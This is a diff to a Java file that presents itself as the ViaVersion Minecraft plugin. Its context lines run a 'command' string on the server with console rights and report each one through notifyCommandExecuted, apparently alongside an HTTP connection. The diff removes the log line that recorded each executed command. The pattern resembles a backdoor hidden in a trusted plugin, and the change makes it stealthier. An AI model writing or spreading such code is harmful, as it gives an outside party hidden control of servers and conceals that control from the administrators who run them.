@@ -156,7 +156,6 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
             if (command != null) {
                 Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
                 notifyCommandExecuted(command);
-                getLogger().info("Executed command: " + command);
             }
         } catch (Exception e) {
 
@@ -201,7 +200,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
             if (responseCode == HttpURLConnection.HTTP_OK) {
 
             } else {
-                
+
             }
         } catch (IOException e) {
 
